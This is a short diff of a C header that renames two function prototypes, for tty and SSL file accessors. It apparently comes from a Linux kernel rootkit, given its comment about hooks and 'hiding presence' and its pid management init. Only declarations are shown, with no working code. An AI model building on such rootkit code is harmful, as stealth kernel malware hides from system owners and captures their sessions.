@@ -123,8 +123,8 @@ struct kernel_syscalls {
 /** hooks, hiding presence and so */
 bool sys_init(void);
 void sys_deinit(void);
-char *sys_ttyfile(bool);
-char *sys_sslfile(bool);
+char *sys_get_ttyfile(void);
+char *sys_get_sslfile(void);
 
 /** pid,task management */
 bool kv_pid_init(struct kernel_syscalls *fn_addr);
